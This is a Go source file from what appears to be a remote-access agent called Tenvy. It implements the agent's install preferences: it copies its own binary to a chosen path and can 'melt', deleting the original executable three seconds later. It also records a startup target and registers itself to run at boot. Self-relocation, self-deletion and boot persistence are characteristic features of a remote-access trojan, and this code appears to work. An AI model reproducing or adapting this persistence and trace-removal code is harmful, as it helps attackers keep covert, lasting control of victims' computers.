package agent

import (
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func (a *Agent) applyPreferences() {
	installPath := strings.TrimSpace(a.preferences.InstallPath)
	resolvedTarget := ""

	if installPath != "" {
		dest, err := a.ensureInstallation(installPath)
		if err != nil {
			a.logger.Printf("failed to apply installation preference (%s): %v", installPath, err)
		} else {
			resolvedTarget = dest
			a.logger.Printf("persisted agent binary at %s", installPath)
		}
	} else if a.preferences.MeltAfterRun {
		a.logger.Printf("melt preference ignored because no installation path was provided")
	}

	if a.preferences.StartupOnBoot {
		target := resolvedTarget
		if target == "" {
			if exe, err := os.Executable(); err == nil {
				target = exe
			}
		}
		if err := configureStartupPreference(target); err != nil {
			a.logger.Printf("startup preference not fully applied: %v", err)
		} else {
			a.logger.Printf("recorded startup preference for %s", target)
		}
	}
}

func (a *Agent) ensureInstallation(target string) (string, error) {
	target = strings.TrimSpace(target)
	if target == "" {
		return "", nil
	}

	executable, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("resolve executable: %w", err)
	}

	executable, err = filepath.Abs(executable)
	if err != nil {
		return "", fmt.Errorf("resolve executable path: %w", err)
	}

	destPath := target
	if strings.HasSuffix(target, string(os.PathSeparator)) {
		if err := os.MkdirAll(target, 0o755); err != nil {
			return "", fmt.Errorf("create install directory: %w", err)
		}
		destPath = filepath.Join(target, filepath.Base(executable))
	} else {
		info, statErr := os.Stat(target)
		if statErr == nil && info.IsDir() {
			destPath = filepath.Join(target, filepath.Base(executable))
		} else if statErr != nil {
			if !os.IsNotExist(statErr) {
				return "", fmt.Errorf("inspect install path: %w", statErr)
			}
			parent := filepath.Dir(target)
			if err := os.MkdirAll(parent, 0o755); err != nil {
				return "", fmt.Errorf("prepare install parent: %w", err)
			}
		}
	}

	destPath, err = filepath.Abs(destPath)
	if err != nil {
		return "", fmt.Errorf("resolve destination path: %w", err)
	}

	if samePath(executable, destPath) {
		return destPath, nil
	}

	if err := copyBinary(executable, destPath); err != nil {
		return "", fmt.Errorf("copy binary: %w", err)
	}

	if a.preferences.MeltAfterRun {
		a.scheduleMelt(executable)
	}

	return destPath, nil
}

func (a *Agent) scheduleMelt(path string) {
	go func() {
		time.Sleep(3 * time.Second)
		if err := os.Remove(path); err != nil && !os.IsNotExist(err) {
			a.logger.Printf("failed to remove staging binary: %v", err)
		}
	}()
}

func configureStartupPreference(target string) error {
	target = strings.TrimSpace(target)
	if target == "" {
		return errors.New("no target provided for startup preference")
	}

	absTarget, err := filepath.Abs(target)
	if err == nil {
		target = absTarget
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("resolve home directory: %w", err)
	}

	var configDir string
	if runtime.GOOS == "windows" {
		configDir = filepath.Join(homeDir, "AppData", "Roaming", "Tenvy")
	} else {
		configDir = filepath.Join(homeDir, ".config", "tenvy")
	}

	if err := os.MkdirAll(configDir, 0o755); err != nil {
		return fmt.Errorf("create startup config directory: %w", err)
	}

	entryPath := filepath.Join(configDir, "startup-target.txt")
	if err := os.WriteFile(entryPath, []byte(target+"\n"), 0o644); err != nil {
		return fmt.Errorf("persist startup preference: %w", err)
	}

	if err := registerStartup(target); err != nil {
		return fmt.Errorf("register startup entry: %w", err)
	}

	return nil
}

func samePath(a, b string) bool {
	aClean := filepath.Clean(a)
	bClean := filepath.Clean(b)
	if runtime.GOOS == "windows" {
		return strings.EqualFold(aClean, bClean)
	}
	return aClean == bClean
}

func copyBinary(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	tmpPath := dst + ".tmp"
	out, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o755)
	if err != nil {
		return err
	}

	if _, err := io.Copy(out, in); err != nil {
		out.Close()
		os.Remove(tmpPath)
		return err
	}

	if err := out.Close(); err != nil {
		os.Remove(tmpPath)
		return err
	}

	if err := os.Rename(tmpPath, dst); err != nil {
		os.Remove(tmpPath)
		return err
	}

	return nil
}
